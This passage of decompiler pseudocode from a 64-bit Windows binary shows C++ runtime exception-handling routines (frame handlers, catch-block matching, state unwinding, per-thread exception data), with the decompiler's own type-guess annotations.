  if ( v0 )
    return *(_DWORD *)(v0 + 48) > 0;
  return result;
}

//----- (000000013F15FBE0) ----------------------------------------------------
__int64 *__fastcall sub_13F15FBE0(__int64 *a1)
{
  __int64 *result; // rax

  if ( a1 )
  {
    result = qword_13F1C5EE0;
    if ( a1 != qword_13F1C5EE0 )
      return (__int64 *)sub_13F16A188(a1);
  }
  return result;
}
// 13F16A188: using guessed type __int64 __fastcall sub_13F16A188(_QWORD);
// 13F1C5EE0: using guessed type __int64 qword_13F1C5EE0[15];

//----- (000000013F15FC00) ----------------------------------------------------
__int64 sub_13F15FC00()
{
  __int64 result; // rax

  result = sub_13F15FC1C();
  if ( !result )
    sub_13F16DDAC();
  return result;
}

//----- (000000013F15FC1C) ----------------------------------------------------
__int64 sub_13F15FC1C()
{
  unsigned int v0; // edi
  __int64 v1; // rax
  __int64 v2; // rsi
  __int64 v3; // rax
  __int64 v4; // rbx
  __int64 v5; // rax

  v0 = MEMORY[0x76F91760]();
  v1 = sub_13F167C04(3u);
  v2 = 0i64;
  if ( v1 != -1 )
  {
    if ( v1 )
    {
      v2 = v1;
    }
    else if ( (unsigned int)sub_13F167C4C(3u, -1i64) )
    {
      v3 = sub_13F16A180(1ui64, 0x90ui64);
      v4 = v3;
      if ( v3 && (unsigned int)sub_13F167C4C(3u, v3) )
      {
        *(_DWORD *)(v4 + 120) = -2;
        *(_QWORD *)(v4 + 128) = -2i64;
        v5 = v4;
        v4 = 0i64;
        v2 = v5;
      }
      else
      {
        sub_13F167C4C(3u, 0i64);
      }
      sub_13F16A188(v4);
    }
  }
  MEMORY[0x76F91780](v0);
  return v2;
}
// 13F16A188: using guessed type __int64 __fastcall sub_13F16A188(_QWORD);

//----- (000000013F15FCE8) ----------------------------------------------------
__int64 sub_13F15FCE8()
{
  unsigned int v0; // ebx
  __int64 v1; // rdi

  v0 = MEMORY[0x76F91760]();
  v1 = sub_13F167C04(3u);
  MEMORY[0x76F91780](v0);
  if ( v1 == -1 )
    return 0i64;
  return v1;
}

//----- (000000013F15FD38) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
char sub_13F15FD38()
{
  unsigned int v0; // eax
  char result; // al

  v0 = sub_13F167B74((__int64)sub_13F15FBE0);
  dword_13F1B72E0 = v0;
  if ( v0 != -1 )
  {
    if ( (unsigned int)sub_13F167C4C(v0, (__int64)qword_13F1C5EE0) )
    {
      result = 1;
      dword_13F1C5F58 = -2;
      qword_13F1C5F60 = -2i64;
      return result;
    }
    sub_13F15FD8C();
  }
  return 0;
}
// 13F15FD48: write access to const memory at 13F1B72E0 has been detected
// 13F15FD6C: write access to const memory at 13F1C5F58 has been detected
// 13F15FD72: write access to const memory at 13F1C5F60 has been detected
// 13F1B72E0: using guessed type int dword_13F1B72E0;
// 13F1C5EE0: using guessed type __int64 qword_13F1C5EE0[15];
// 13F1C5F58: using guessed type int dword_13F1C5F58;
// 13F1C5F60: using guessed type __int64 qword_13F1C5F60;

//----- (000000013F15FD8C) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
char sub_13F15FD8C()
{
  sub_13F167BBC(3u);
  dword_13F1B72E0 = -1;
  return 1;
}
// 13F15FDA0: write access to const memory at 13F1B72E0 has been detected
// 13F1B72E0: using guessed type int dword_13F1B72E0;

//----- (000000013F15FDB0) ----------------------------------------------------
__int64 __fastcall sub_13F15FDB0(_QWORD *a1, unsigned __int64 *a2, __int64 a3)
{
  __int64 result; // rax

  result = *(unsigned int *)(*(int *)(a3 + 28) + *a1);
  if ( (_DWORD)result == -2 )
    return sub_13F15FE54(a3, (__int64)a2, *a2);
  return result;
}

//----- (000000013F15FDD8) ----------------------------------------------------
__int64 __fastcall sub_13F15FDD8(_QWORD *a1, unsigned __int64 *a2, __int64 a3)
{
  __int64 v4; // rcx
  __int64 v5; // rax
  __int64 v7; // [rsp+40h] [rbp+18h] BYREF

  v4 = *sub_13F15DFB8(a1, a2, a3, &v7);
  v5 = *(int *)(a3 + 28);
  v7 = v4;
  return *(unsigned int *)(v5 + v4 + 4);
}

//----- (000000013F15FE04) ----------------------------------------------------
__int64 __fastcall sub_13F15FE04(__int64 *a1, __int64 a2, int a3)
{
  __int64 result; // rax

  result = *a1;
  *(_DWORD *)(*(int *)(a2 + 28) + *a1) = a3;
  return result;
}

//----- (000000013F15FE10) ----------------------------------------------------
__int64 __fastcall sub_13F15FE10(_QWORD *a1, unsigned __int64 *a2, __int64 a3, int a4)
{
  __int64 v6; // rcx
  __int64 result; // rax
  __int64 v8; // [rsp+40h] [rbp+18h] BYREF

  v6 = *sub_13F15DFB8(a1, a2, a3, &v8);
  result = *(int *)(a3 + 28);
  v8 = v6;
  if ( a4 > *(_DWORD *)(result + v6 + 4) )
    *(_DWORD *)(result + v6 + 4) = a4;
  return result;
}

//----- (000000013F15FE4C) ----------------------------------------------------
__int64 __fastcall sub_13F15FE4C(__int64 a1, unsigned __int64 *a2)
{
  return sub_13F15FE54(a1, (__int64)a2, *a2);
}

//----- (000000013F15FE54) ----------------------------------------------------
__int64 __fastcall sub_13F15FE54(__int64 a1, __int64 a2, unsigned __int64 a3)
{
  __int64 v4; // r11
  __int64 v5; // r10
  unsigned int v6; // er8
  __int64 v7; // r9

  if ( !a1 || (v4 = *(int *)(a1 + 24), v5 = *(_QWORD *)(a2 + 8), !(v4 + v5)) )
    sub_13F16A158();
  v6 = *(_DWORD *)(a1 + 20);
  v7 = 0i64;
  if ( !v6 )
    return 0xFFFFFFFFi64;
  do
  {
    if ( a3 < v5 + (unsigned __int64)*(unsigned int *)(v4 + 8 * v7 + v5) )
      break;
    v7 = (unsigned int)(v7 + 1);
  }
  while ( (unsigned int)v7 < v6 );
  if ( (_DWORD)v7 )
    return *(unsigned int *)(v4 + 8i64 * (unsigned int)(v7 - 1) + v5 + 4);
  else
    return 0xFFFFFFFFi64;
}

//----- (000000013F15FEBC) ----------------------------------------------------
__int64 __fastcall sub_13F15FEBC(__int64 a1, __m128i *a2, int *a3, __int64 a4)
{
  unsigned int v8; // edi
  __int64 v9; // r15
  __int64 v10; // rdx
  __int64 v11; // rcx
  __int64 v12; // rcx
  const __m128i *v13; // rdx
  __int64 v14; // rbx
  __int64 v15; // rcx
  __int64 v16; // rcx
  unsigned __int64 v17; // rbx
  const __m128i *v18; // rax
  __int64 v19; // rcx

  v8 = 0;
  if ( a3[1] )
  {
    v9 = a3[1];
    v10 = v9 + sub_13F15E394();
  }
  else
  {
    v10 = 0i64;
    LODWORD(v9) = 0;
  }
  if ( v10 )
  {
    v11 = (_DWORD)v9 ? a3[1] + sub_13F15E394() : 0i64;
    if ( *(_BYTE *)(v11 + 16) && (a3[2] || *a3 < 0) )
    {
      if ( *a3 >= 0 )
        a2 = (__m128i *)(a2->m128i_i64[0] + a3[2]);
      if ( (*(_BYTE *)a3 & 8) != 0 )
      {
        v12 = *(_QWORD *)(a1 + 40);
        if ( !v12 || !a2 )
          sub_13F16A158();
        a2->m128i_i64[0] = v12;
      }
      else
      {
        if ( (*(_BYTE *)a4 & 1) == 0 )
        {
          if ( *(_DWORD *)(a4 + 24) )
          {
            v14 = *(int *)(a4 + 24);
            v15 = v14 + sub_13F15E3A8();
          }
          else
          {
            v15 = 0i64;
            LODWORD(v14) = 0;
          }
          if ( v15 )
          {
            if ( !*(_QWORD *)(a1 + 40)
              || !a2
              || (!(_DWORD)v14 ? (v19 = 0i64) : (v19 = *(int *)(a4 + 24) + sub_13F15E3A8()), !v19) )
            {
              sub_13F16A158();
            }
            return (unsigned int)((*(_BYTE *)a4 & 4) != 0) + 1;
          }
          else
          {
            v16 = *(_QWORD *)(a1 + 40);
            if ( !v16 || !a2 )
              sub_13F16A158();
            v17 = *(int *)(a4 + 20);
            v18 = (const __m128i *)sub_13F15E748(v16, (int *)(a4 + 8));
            sub_13F15EB00(a2, v18, v17);
          }
          return v8;
        }
        v13 = *(const __m128i **)(a1 + 40);
        if ( !v13 || !a2 )
          sub_13F16A158();
        sub_13F15EB00(a2, v13, *(int *)(a4 + 20));
        if ( *(_DWORD *)(a4 + 20) != 8 || !a2->m128i_i64[0] )
          return v8;
        v12 = a2->m128i_i64[0];
      }
      a2->m128i_i64[0] = sub_13F15E748(v12, (int *)(a4 + 8));
      return v8;
    }
  }
  return 0i64;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F1600BC) ----------------------------------------------------
__int64 __fastcall sub_13F1600BC(__int64 a1, __m128i *a2, int *a3, __int64 a4)
{
  __int64 (__fastcall *v6)(__int64, __int64); // rbx
  __m128i *v7; // rsi
  __int64 result; // rax
  __int64 v9; // rax
  __int64 v10; // rax

  v6 = 0i64;
  if ( *a3 >= 0 )
    v7 = (__m128i *)(a2->m128i_i64[0] + a3[2]);
  else
    v7 = a2;
  result = (unsigned int)sub_13F15FEBC(a1, a2, a3, a4) - 1;
  if ( (_DWORD)result )
  {
    if ( (_DWORD)result == 1 )
    {
      if ( *(_DWORD *)(a4 + 24) )
        v6 = (__int64 (__fastcall *)(__int64, __int64))(*(int *)(a4 + 24) + sub_13F15E3A8());
      v9 = sub_13F15E748(*(_QWORD *)(a1 + 40), (int *)(a4 + 8));
      return sub_13F1612E4((__int64)v7, (__int64 (__fastcall *)(__int64, __int64, _QWORD))v6, v9, 1u);
    }
  }
  else
  {
    if ( *(_DWORD *)(a4 + 24) )
      v6 = (__int64 (__fastcall *)(__int64, __int64))(*(int *)(a4 + 24) + sub_13F15E3A8());
    v10 = sub_13F15E748(*(_QWORD *)(a1 + 40), (int *)(a4 + 8));
    return sub_13F1612D8((__int64)v7, v6, v10);
  }
  return result;
}

//----- (000000013F16017C) ----------------------------------------------------
__int64 __fastcall sub_13F16017C(
        __int64 a1,
        __int64 *a2,
        __int64 a3,
        unsigned __int64 *a4,
        __int64 a5,
        int *a6,
        __int64 a7,
        int *a8,
        int a9,
        int a10,
        int a11,
        unsigned __int8 a12)
{
  __int64 v12; // r15
  __m128i *v17; // rax
  __int64 v18; // rsi
  int *v19; // rbx
  __int64 v20; // rax
  __int64 v22; // [rsp+98h] [rbp+10h] BYREF

  v12 = a5;
  v17 = (__m128i *)sub_13F15DFB8(a2, a4, a5, &v22);
  v18 = (__int64)v17;
  v19 = a6;
  if ( a7 )
    sub_13F1600BC(a1, v17, a6, a7);
  v20 = sub_13F15E394();
  return sub_13F15E1E0(a2, a1, a3, v18, v19[3] + v20, v12, *a8, a8[2], (int)v19, (__int64 *)a4, a12);
}

//----- (000000013F16024C) ----------------------------------------------------
__int64 __fastcall sub_13F16024C(
        __int64 a1,
        __int64 *a2,
        __int64 a3,
        unsigned __int64 *a4,
        _DWORD *a5,
        unsigned __int8 a6,
        int a7,
        __int64 a8)
{
  __int64 *v8; // r12
  __int64 v9; // r14
  char v11; // r13
  int v13; // eax
  int v14; // er15
  __int64 result; // rax
  int *v16; // r14
  __int64 v17; // r8
  unsigned int v18; // er12
  int *v19; // r14
  int v20; // eax
  __int64 v21; // r13
  unsigned __int64 v22; // rdx
  __int64 v23; // rax
  _BYTE *v24; // r8
  __int64 v25; // rax
  _DWORD *v26; // rdx
  _QWORD *v27; // rax
  int v28; // [rsp+58h] [rbp-89h]
  char v29; // [rsp+68h] [rbp-79h]
  char v30; // [rsp+69h] [rbp-78h]
  int v31; // [rsp+6Ch] [rbp-75h]
  int v32; // [rsp+70h] [rbp-71h]
  int *v33; // [rsp+78h] [rbp-69h]
  int *v34; // [rsp+80h] [rbp-61h]
  __int64 v35; // [rsp+88h] [rbp-59h]
  __int64 v36; // [rsp+90h] [rbp-51h] BYREF
  unsigned __int64 v37; // [rsp+98h] [rbp-49h]
  __m128i pExceptionObject; // [rsp+A0h] [rbp-41h] BYREF
  __int64 v39[2]; // [rsp+B8h] [rbp-29h] BYREF
  __m128i v40; // [rsp+C8h] [rbp-19h] BYREF
  unsigned int v41; // [rsp+E0h] [rbp-1h]
  __int64 v43; // [rsp+138h] [rbp+57h]

  v43 = a3;
  v8 = a2;
  v9 = a3;
  v30 = 0;
  v11 = 0;
  v29 = 0;
  v13 = sub_13F1610D4(a2, a4, (__int64)a5);
  v14 = v13;
  if ( v13 < -1 || v13 >= a5[1] )
    goto LABEL_56;
  if ( *(_DWORD *)a1 != -529697949
    || *(_DWORD *)(a1 + 24) != 4
    || (unsigned int)(*(_DWORD *)(a1 + 32) - 429065504) > 2
    || *(_QWORD *)(a1 + 48) )
  {
    goto LABEL_17;
  }
  result = sub_13F15FC00();
  if ( !*(_QWORD *)(result + 32) )
    return result;
  a1 = *(_QWORD *)(sub_13F15FC00() + 32);
  v30 = 1;
  v9 = *(_QWORD *)(sub_13F15FC00() + 40);
  v43 = v9;
  sub_13F15E3D4(*(_QWORD *)(a1 + 56));
  if ( *(_DWORD *)a1 == -529697949
    && *(_DWORD *)(a1 + 24) == 4
    && (unsigned int)(*(_DWORD *)(a1 + 32) - 429065504) <= 2
    && !*(_QWORD *)(a1 + 48) )
  {
LABEL_56:
    sub_13F16A158();
  }
  if ( *(_QWORD *)(sub_13F15FC00() + 56) )
  {
    v16 = *(int **)(sub_13F15FC00() + 56);
    *(_QWORD *)(sub_13F15FC00() + 56) = 0i64;
    if ( !sub_13F16116C(a1, v16) )
    {
      if ( sub_13F161244(v16) )
      {
        sub_13F15E6A0(a1);
        sub_13F160CAC(&pExceptionObject);
        CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVbad_exception_std__);
      }
      goto LABEL_56;
    }
    v9 = v43;
  }
LABEL_17:
  v39[0] = (__int64)a5;
  v39[1] = (__int64)a4;
  if ( *(_DWORD *)a1 == -529697949 && *(_DWORD *)(a1 + 24) == 4 && (unsigned int)(*(_DWORD *)(a1 + 32) - 429065504) <= 2 )
  {
    if ( a5[3] )
    {
      sub_13F15E084(&v40, v39, v14);
      pExceptionObject = v40;
      if ( _mm_cvtsi128_si32(_mm_srli_si128(v40, 8)) < v41 )
      {
        v17 = v40.m128i_i64[0];
        v18 = pExceptionObject.m128i_u32[2];
        v35 = v40.m128i_i64[0];
        do
        {
          v19 = (int *)(*(_QWORD *)(*(_QWORD *)(v17 + 8) + 8i64)
                      + *(int *)(*(_QWORD *)pExceptionObject.m128i_i64[0] + 16i64)
                      + 20i64 * v18);
          if ( *v19 <= v14 && v14 <= v19[1] )
          {
            v20 = v19[3];
            v21 = 0i64;
            v22 = a4[1] + v19[4];
            v37 = v22;
            v32 = v20;
            if ( v20 )
            {
              while ( 1 )
              {
                v34 = (int *)(v22 + 20 * v21);
                v33 = (int *)(*(int *)(*(_QWORD *)(a1 + 48) + 12i64) + sub_13F15E3A8() + 4);
                v31 = *(_DWORD *)(sub_13F15E3A8() + *(int *)(*(_QWORD *)(a1 + 48) + 12i64));
                if ( v31 > 0 )
                  break;
LABEL_29:
                v21 = (unsigned int)(v21 + 1);
                if ( (_DWORD)v21 == v32 )
                {
                  v17 = v35;
                  goto LABEL_33;
                }
                v22 = v37;
              }
              while ( 1 )
              {
                v23 = sub_13F15E3A8();
                v24 = *(_BYTE **)(a1 + 48);
                v36 = *v33 + v23;
                if ( (unsigned int)sub_13F1608E0((__int64)v34, v36, v24) )
                  break;
                ++v33;
                if ( --v31 <= 0 )
                  goto LABEL_29;
              }
              v11 = 1;
              LOBYTE(v28) = v30;
              v29 = 1;
              sub_13F16017C(a1, a2, v43, a4, (__int64)a5, v34, v36, v19, a7, a8, v28, a6);
              v17 = v35;
            }
            else
            {
LABEL_33:
              v11 = v29;
            }
          }
          ++v18;
        }
        while ( v18 < v41 );
        if ( v11 )
          goto LABEL_53;
        v8 = a2;
      }
    }
    if ( (*a5 & 0x1FFFFFFFu) >= 0x19930521 )
    {
      v25 = a5[8] ? (int)a5[8] + sub_13F15E394() : 0i64;
      if ( v25 || (a5[9] & 4) != 0 && !sub_13F15DF28(a4, (__int64)a5) )
      {
        if ( (a5[9] & 4) != 0 )
          goto LABEL_56;
        if ( a5[8] )
          v26 = (_DWORD *)((int)a5[8] + sub_13F15E394());
        else
          v26 = 0i64;
        if ( !sub_13F16116C(a1, v26) )
        {
          v27 = sub_13F15DFB8(v8, a4, (__int64)a5, &v36);
          sub_13F15E1E0(v8, a1, v43, (__int64)v27, 0i64, (__int64)a5, -1, -1, 0, (__int64 *)a4, a6);
        }
      }
    }
  }
  else if ( a5[3] )
  {
    if ( a6 )
      goto LABEL_56;
    sub_13F1606B0((_DWORD *)a1, v8, v9, a4, (__int64)a5, v14, a7, a8);
  }
LABEL_53:
  result = sub_13F15FC00();
  if ( *(_QWORD *)(result + 56) )
    goto LABEL_56;
  return result;
}
// 13F160522: variable 'v28' is possibly undefined
// 13F16024C: using guessed type __m128i var_50;
// 13F16024C: using guessed type __m128i pExceptionObject;

//----- (000000013F1606B0) ----------------------------------------------------
void __fastcall sub_13F1606B0(
        _DWORD *a1,
        __int64 *a2,
        __int64 a3,
        unsigned __int64 *a4,
        __int64 a5,
        int a6,
        int a7,
        __int64 a8)
{
  __int64 v12; // rbx
  int v13; // er14
  __int64 v14; // r8
  unsigned int v15; // ebp
  int *v16; // rbx
  int *v17; // r14
  __int64 v18; // r12
  __int64 v19; // rax
  __int64 v20; // rax
  int v21; // [rsp+50h] [rbp-88h]
  __int64 v22[2]; // [rsp+60h] [rbp-78h] BYREF
  __m128i v23; // [rsp+70h] [rbp-68h]
  __m128i v24; // [rsp+80h] [rbp-58h] BYREF
  unsigned int v25; // [rsp+98h] [rbp-40h]
  __int64 v26; // [rsp+E0h] [rbp+8h]

  if ( *a1 != -2147483645 )
  {
    if ( !*(_QWORD *)(sub_13F15FC00() + 16)
      || (v12 = MEMORY[0x771C0850](0i64), *(_QWORD *)(sub_13F15FC00() + 16) == v12)
      || *a1 == -532459699
      || *a1 == -532462766
      || !(unsigned int)sub_13F15DE7C(a1, (__int64)a2, a3) )
    {
      v22[0] = a5;
      v22[1] = (__int64)a4;
      if ( !*(_DWORD *)(a5 + 12) )
        sub_13F16A158();
      v13 = a6;
      sub_13F15E084(&v24, v22, a6);
      v23 = v24;
      if ( _mm_cvtsi128_si32(_mm_srli_si128(v24, 8)) < v25 )
      {
        v14 = v24.m128i_i64[0];
        v15 = v23.m128i_u32[2];
        v26 = v24.m128i_i64[0];
        do
        {
          v16 = (int *)(*(_QWORD *)(*(_QWORD *)(v14 + 8) + 8i64)
                      + *(int *)(*(_QWORD *)v23.m128i_i64[0] + 16i64)
                      + 20i64 * v15);
          if ( *v16 <= v13 && v13 <= v16[1] )
          {
            v17 = (int *)(v16[4] + 20i64 * (unsigned int)v16[3] + a4[1] - 20);
            if ( v17[1] )
            {
              v18 = v17[1];
              v19 = v18 + sub_13F15E394();
            }
            else
            {
              v19 = 0i64;
              LODWORD(v18) = 0;
            }
            if ( !v19 || (!(_DWORD)v18 ? (v20 = 0i64) : (v20 = v17[1] + sub_13F15E394()), !*(_BYTE *)(v20 + 16)) )
            {
              if ( (*(_BYTE *)v17 & 0x40) == 0 )
              {
                LOBYTE(v21) = 1;
                sub_13F16017C((__int64)a1, a2, a3, a4, a5, v17, 0i64, v16, a7, a8, v21, 0);
              }
            }
            v13 = a6;
            v14 = v26;
          }
          ++v15;
        }
        while ( v15 < v25 );
      }
    }
  }
}
// 13F160899: variable 'v21' is possibly undefined
// 13F1606B0: using guessed type __m128i var_58;

//----- (000000013F1608E0) ----------------------------------------------------
__int64 __fastcall sub_13F1608E0(__int64 a1, __int64 a2, _BYTE *a3)
{
  unsigned int v3; // ebx
  __int64 v7; // rsi
  __int64 v8; // rcx
  __int64 v9; // rsi
  __int64 v10; // rcx
  __int64 v11; // rsi
  __int64 v12; // rsi
  __int64 v13; // r8
  unsigned __int8 *v14; // rax
  __int64 v15; // r8
  int v16; // edx
  int v17; // ecx

  v3 = 0;
  if ( *(_DWORD *)(a1 + 4) )
  {
    v7 = *(int *)(a1 + 4);
    v8 = v7 + sub_13F15E394();
  }
  else
  {
    v8 = 0i64;
    LODWORD(v7) = 0;
  }
  if ( !v8 )
    return 1i64;
  if ( (_DWORD)v7 )
  {
    v9 = *(int *)(a1 + 4);
    v10 = v9 + sub_13F15E394();
  }
  else
  {
    v10 = 0i64;
    LODWORD(v9) = 0;
  }
  if ( !*(_BYTE *)(v10 + 16) || *(char *)a1 < 0 && (*(_BYTE *)a2 & 0x10) != 0 )
    return 1i64;
  if ( (_DWORD)v9 )
    v11 = *(int *)(a1 + 4) + sub_13F15E394();
  else
    v11 = 0i64;
  if ( v11 != *(int *)(a2 + 4) + sub_13F15E3A8() )
  {
    v12 = *(_DWORD *)(a1 + 4) ? *(int *)(a1 + 4) + sub_13F15E394() : 0i64;
    v13 = sub_13F15E3A8() + *(int *)(a2 + 4) + 16i64;
    v14 = (unsigned __int8 *)(v12 + 16);
    v15 = v13 - (v12 + 16);
    do
    {
      v16 = v14[v15];
      v17 = *v14 - v16;
      if ( v17 )
        break;
      ++v14;
    }
    while ( v16 );
    if ( v17 )
      return 0i64;
  }
  if ( ((*(_BYTE *)a2 & 2) == 0 || (*(_BYTE *)a1 & 8) != 0)
    && ((*a3 & 1) == 0 || (*(_BYTE *)a1 & 1) != 0)
    && ((*a3 & 4) == 0 || (*(_BYTE *)a1 & 4) != 0)
    && ((*a3 & 2) == 0 || (*(_BYTE *)a1 & 2) != 0) )
  {
    return 1;
  }
  return v3;
}

//----- (000000013F160A24) ----------------------------------------------------
__int64 __fastcall sub_13F160A24(
        __int64 a1,
        __int64 *a2,
        __int64 a3,
        unsigned __int64 *a4,
        __int64 a5,
        int a6,
        __int64 a7,
        unsigned __int8 a8)
{
  int v12; // eax
  int v13; // er9
  __int64 *v14; // rcx
  __int64 v15; // rax
  __int64 (__fastcall *v16)(__int64, __int64 *, __int64, unsigned __int64 *, __int64, int, __int64, _DWORD); // r10

  sub_13F167DC4(a3);
  if ( *(_DWORD *)(sub_13F15FC00() + 64) || *(_DWORD *)a1 == -529697949 )
    goto LABEL_9;
  if ( *(_DWORD *)a1 != -2147483607 )
    goto LABEL_6;
  if ( *(_DWORD *)(a1 + 24) == 15 )
  {
    if ( *(_QWORD *)(a1 + 96) == 429065504i64 )
      goto LABEL_9;
LABEL_6:
    if ( *(_DWORD *)a1 == -2147483610 )
      goto LABEL_9;
  }
  if ( (*(_DWORD *)a5 & 0x1FFFFFFFu) >= 0x19930522 && (*(_BYTE *)(a5 + 36) & 1) != 0 )
    return 1i64;
LABEL_9:
  if ( (*(_BYTE *)(a1 + 4) & 0x66) != 0 )
  {
    if ( !*(_DWORD *)(a5 + 4) || a6 )
      return 1i64;
    if ( (*(_BYTE *)(a1 + 4) & 0x20) != 0 )
    {
      if ( *(_DWORD *)a1 == -2147483610 )
      {
        v12 = sub_13F15FE54(a5, (__int64)a4, a4[4]);
        if ( v12 >= -1 && v12 < *(_DWORD *)(a5 + 4) )
        {
          v13 = v12;
          v14 = a2;
LABEL_17:
          sub_13F160F40(v14, a4, a5, v13);
          return 1i64;
        }
        goto LABEL_41;
      }
      if ( *(_DWORD *)a1 == -2147483607 )
      {
        v13 = *(_DWORD *)(a1 + 56);
        if ( v13 >= -1 && v13 < *(_DWORD *)(a5 + 4) )
        {
          v14 = *(__int64 **)(a1 + 40);
          goto LABEL_17;
        }
LABEL_41:
        sub_13F16A158();
      }
    }
    sub_13F15DF54(a2, a4, a5);
    return 1i64;
  }
  if ( *(_DWORD *)(a5 + 12)
    || (*(_DWORD *)a5 & 0x1FFFFFFFu) >= 0x19930521
    && (!*(_DWORD *)(a5 + 32) ? (v15 = 0i64) : (v15 = *(int *)(a5 + 32) + sub_13F15E394()), v15)
    || (*(_DWORD *)a5 & 0x1FFFFFFFu) >= 0x19930522 && (*(_DWORD *)(a5 + 36) & 4) != 0 )
  {
    if ( *(_DWORD *)a1 == -529697949 && *(_DWORD *)(a1 + 24) >= 3u && *(_DWORD *)(a1 + 32) > 0x19930522u )
    {
      v16 = *(_DWORD *)(*(_QWORD *)(a1 + 48) + 8i64) ? (__int64 (__fastcall *)(__int64, __int64 *, __int64, unsigned __int64 *, __int64, int, __int64, _DWORD))(sub_13F15E3A8() + *(int *)(*(_QWORD *)(a1 + 48) + 8i64)) : 0i64;
      if ( v16 )
        return v16(a1, a2, a3, a4, a5, a6, a7, a8);
    }
    sub_13F16024C(a1, a2, a3, a4, (_DWORD *)a5, a8, a6, a7);
  }
  return 1i64;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F160C6C) ----------------------------------------------------
_QWORD *__fastcall sub_13F160C6C(_QWORD *a1, __int64 a2)
{
  *a1 = &std::exception::`vftable';
  a1[1] = 0i64;
  a1[2] = 0i64;
  sub_13F15E46C(a2 + 8, (__int64)(a1 + 1));
  *a1 = &std::bad_exception::`vftable';
  return a1;
}
// 13F18C6F8: using guessed type void *std::bad_exception::`vftable';

//----- (000000013F160CAC) ----------------------------------------------------
_QWORD *__fastcall sub_13F160CAC(_QWORD *a1)
{
  a1[2] = 0i64;
  a1[1] = "bad exception";
  *a1 = &std::bad_exception::`vftable';
  return a1;
}
// 13F18C6F8: using guessed type void *std::bad_exception::`vftable';

//----- (000000013F160CCC) ----------------------------------------------------
__int64 __fastcall sub_13F160CCC(_QWORD *a1)
{
  __int64 v2; // r13
  __int64 v3; // rsi
  __int64 v4; // rbx
  _QWORD *v5; // r14
  __int64 v6; // rax
  _QWORD *v7; // r12
  __int64 v8; // rax
  __int64 v9; // rbx
  __int64 v11; // [rsp+30h] [rbp-78h]
  __int64 v12[9]; // [rsp+60h] [rbp-48h] BYREF
  __int64 v13; // [rsp+C0h] [rbp+18h]

  v2 = *(_QWORD *)(sub_13F15FC00() + 40);
  v13 = *(_QWORD *)(sub_13F15FC00() + 32);
  v3 = a1[10];
  v11 = a1[9];
  v4 = a1[8];
  v5 = (_QWORD *)a1[5];
  sub_13F167DC4(v4);
  *(_QWORD *)(sub_13F15FC00() + 32) = v3;
  *(_QWORD *)(sub_13F15FC00() + 40) = v4;
  v6 = sub_13F15FC00();
  v7 = sub_13F15E304(v12, *(_QWORD *)(*(_QWORD *)(v6 + 32) + 40i64));
  if ( a1[11] )
    sub_13F15FC00();
  sub_13F167E10();
  v9 = v8;
  sub_13F15E340((__int64)v7);
  if ( *(_DWORD *)v3 == -529697949
    && *(_DWORD *)(v3 + 24) == 4
    && (unsigned int)(*(_DWORD *)(v3 + 32) - 429065504) <= 2
    && (unsigned int)sub_13F15E718(*(_QWORD *)(v3 + 40)) )
  {
    sub_13F15E6A0(v3);
  }
  *(_QWORD *)(sub_13F15FC00() + 32) = v13;
  *(_QWORD *)(sub_13F15FC00() + 40) = v2;
  *(_QWORD *)(*(int *)(v11 + 28) + *v5) = -2i64;
  return v9;
}
// 13F160E49: conditional instruction was optimized away because er15.4==0
// 13F160D99: ignored the value written to the shadow area of the succeeding call
// 13F160DB4: variable 'v8' is possibly undefined
// 13F160CCC: using guessed type __int64 var_48[9];

//----- (000000013F160EB8) ----------------------------------------------------
__int64 __fastcall sub_13F160EB8(__int64 *a1, __int64 a2, _DWORD *a3)
{
  __int64 v3; // r9
  __int64 result; // rax

  v3 = *a1;
  *a3 = 0;
  if ( *(_DWORD *)v3 != -529697949 )
    return 0i64;
  if ( *(_DWORD *)(v3 + 24) != 4 )
    return 0i64;
  if ( (unsigned int)(*(_DWORD *)(v3 + 32) - 429065504) <= 2 && *(_QWORD *)(v3 + 40) == *(_QWORD *)(a2 + 40) )
  {
    *a3 = 1;
    if ( *(_DWORD *)v3 != -529697949 )
      return 0i64;
  }
  if ( *(_DWORD *)(v3 + 24) != 4 || (unsigned int)(*(_DWORD *)(v3 + 32) - 429065504) > 2 || *(_QWORD *)(v3 + 48) )
    return 0i64;
  *(_DWORD *)(sub_13F15FC00() + 64) = 1;
  result = 1i64;
  *a3 = 1;
  return result;
}

//----- (000000013F160F40) ----------------------------------------------------
__int64 __fastcall sub_13F160F40(__int64 *a1, unsigned __int64 *a2, __int64 a3, int a4)
{
  __int64 v8; // r13
  int v9; // edi
  __int64 v10; // rax
  __int64 v11; // r14
  __int64 v12; // rbx
  __int64 v13; // rax
  __int64 v14; // rax

  v8 = sub_13F15E394();
  v9 = sub_13F15FDB0(a1, a2, a3);
  v10 = sub_13F15FC00();
  ++*(_DWORD *)(v10 + 48);
  while ( v9 != -1 && v9 > a4 )
  {
    if ( v9 <= -1 || v9 >= *(_DWORD *)(a3 + 4) )
      sub_13F16A158();
    v11 = 8i64 * v9;
    v9 = *(_DWORD *)(v11 + *(int *)(a3 + 8) + sub_13F15E394());
    if ( *(_DWORD *)(v11 + *(int *)(a3 + 8) + sub_13F15E394() + 4) )
    {
      v12 = sub_13F15E394();
      v13 = *(int *)(v11 + *(int *)(a3 + 8) + v12 + 4) + sub_13F15E394();
    }
    else
    {
      v13 = 0i64;
    }
    if ( v13 )
    {
      sub_13F15FE04(a1, a3, v9);
      if ( *(_DWORD *)(v11 + *(int *)(a3 + 8) + sub_13F15E394() + 4) )
      {
        sub_13F15E394();
        sub_13F15E394();
      }
      sub_13F167E10();
      sub_13F15E3BC(v8);
    }
  }
  if ( *(int *)(sub_13F15FC00() + 48) > 0 )
  {
    v14 = sub_13F15FC00();
    --*(_DWORD *)(v14 + 48);
  }
  if ( v9 != -1 && v9 > a4 )
    sub_13F16A158();
  return sub_13F15FE04(a1, a3, v9);
}

//----- (000000013F1610D4) ----------------------------------------------------
__int64 __fastcall sub_13F1610D4(_QWORD *a1, unsigned __int64 *a2, __int64 a3)
{
  int v6; // ebx
  __int64 v8; // [rsp+48h] [rbp+20h] BYREF

  v6 = sub_13F15FE4C(a3, a2);
  sub_13F15DFB8(a1, a2, a3, &v8);
  if ( v6 <= (int)sub_13F15FDD8(a1, a2, a3) )
